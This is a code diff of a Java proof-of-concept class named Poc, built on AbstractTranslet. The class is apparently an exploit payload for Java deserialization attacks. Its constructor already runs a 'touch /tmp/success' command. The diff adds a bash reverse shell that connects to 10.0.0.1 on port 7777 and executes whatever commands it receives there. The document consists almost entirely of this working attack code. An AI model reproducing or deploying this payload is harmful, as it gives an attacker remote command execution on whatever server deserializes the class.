@@ -10,6 +10,8 @@ public class Poc extends AbstractTranslet {
 
     public Poc() throws IOException {
         Runtime.getRuntime().exec("touch /tmp/success");
+        Runtime r = Runtime.getRuntime();
+        Process p = r.exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/7777;cat <&5 | while read line; do $line 2>&5 >&5; done"});
     }
 
     @Override
